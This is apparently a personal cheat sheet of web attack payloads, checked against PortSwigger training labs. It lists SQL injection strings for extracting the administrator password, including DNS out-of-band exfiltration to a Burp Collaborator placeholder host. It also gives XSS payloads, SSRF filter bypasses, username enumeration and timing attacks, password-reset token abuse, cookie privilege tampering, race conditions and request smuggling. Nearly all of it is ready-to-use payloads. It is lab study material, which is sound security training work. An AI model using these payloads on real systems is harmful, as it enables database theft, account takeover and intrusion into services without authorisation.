# Hunter Lab Knowledge Base - Real-World Patterns

## SQLi Patterns (Verified in 14 labs)

### Cookie Injection (Most Common in PortSwigger)
```
TrackingId=xyz'||'1'='1   # Boolean true
TrackingId=xyz'||'1'='2   # Boolean false
TrackingId=xyz' AND 1=1-- # Alternative
TrackingId=xyz' AND 1=2-- # Alternative false
```

### UNION Column Detection
```
' ORDER BY 1--    # Increment until 500 error
' UNION SELECT NULL--           # Try 2, 3, 4 NULLs
' UNION SELECT NULL,NULL--      # 2 columns
' UNION SELECT NULL,NULL,NULL-- # 3 columns
```

### DB-Specific Version Extraction
```
# PostgreSQL
' UNION SELECT version(),NULL--

# MySQL
' UNION SELECT @@version,NULL--

# Oracle
' UNION SELECT BANNER,NULL FROM v$version--

# MSSQL
' UNION SELECT @@version,NULL--
```

### Blind Extraction (Character by Character)
```
# PostgreSQL conditional
' AND SUBSTRING(password,1,1)='a'--

# Oracle conditional
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'--

# Time-based PostgreSQL
' || (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

### OOB (Out-of-Band) Exfiltration
```
# MSSQL - embed password in DNS subdomain
';exec master..xp_dirtree '\\'+(SELECT password FROM users WHERE username='administrator')+'.BURP_COLLAB\a'--

# Oracle - DNS lookup
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator')||'.BURP_COLLAB') FROM dual--
```

## XSS Patterns (Verified in 3 labs)

### JavaScript String Context
```
# ' not encoded in <script> context
'-alert(1)-'
"-alert(1)-"
```

### href Attribute Context
```
# javascript: protocol not blocked by double-quote encoding
javascript:alert(1)
```

### DOM jQuery hashchange
```
# iframe approach for delivery
<iframe id="f" src="TARGET"></iframe>
<script>setTimeout(function(){document.getElementById('f').src='TARGET#<img src=x onerror=alert(1)>'},3000);</script>
```

## SSRF Patterns (Verified in 3 labs)

### Host Blacklist Bypass
```
http://127.1              # Short form
http://0x7f000001          # Hex
http://0177.0.0.1          # Octal
http://[::1]               # IPv6
```

### Path Blacklist Bypass
```
http://127.1/%2561dmin     # Double URL encoding
http://127.1/..;/admin     # Semicolon bypass
http://127.1/Admin         # Case bypass
```

### Open Redirect Chain
```
/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

## Auth Patterns (Verified in 7 labs)

### Username Enumeration
```
# Different error messages
"Invalid username" vs "Incorrect password" = valid username exists

# Subtle differences (trailing period/space)
"Invalid username or password." vs "Invalid username or password "
```

### Timing Attack
```
# Valid username: ~1.4s (bcrypt hash comparison)
# Invalid username: ~0.8s (no hash comparison)
# CRITICAL: One request at a time, 5s+ delay
```

### Password Reset Broken Logic
```
# Token not bound to user
POST /forgot-password?temp-forgot-password-token=
temp-forgot-password-token=&username=carlos&new-password-1=hacked&new-password-2=hacked
```

## Other Patterns (Verified)

### Access Control
```
Cookie: Admin=false → Admin=true
```

### Business Logic
```
quantity: -235  # Negative quantity exploit
```

### Race Condition
```
# Concurrent coupon application
POST /cart/coupon ×20 simultaneously
```

### HTTP Request Smuggling
```
# CL.TE (MUST use raw socket, not Burp HTTP/2!)
Content-Length: 25
Transfer-Encoding: chunked

0\r\n\r\nGPOST / HTTP/1.1\r\n\r\n
```
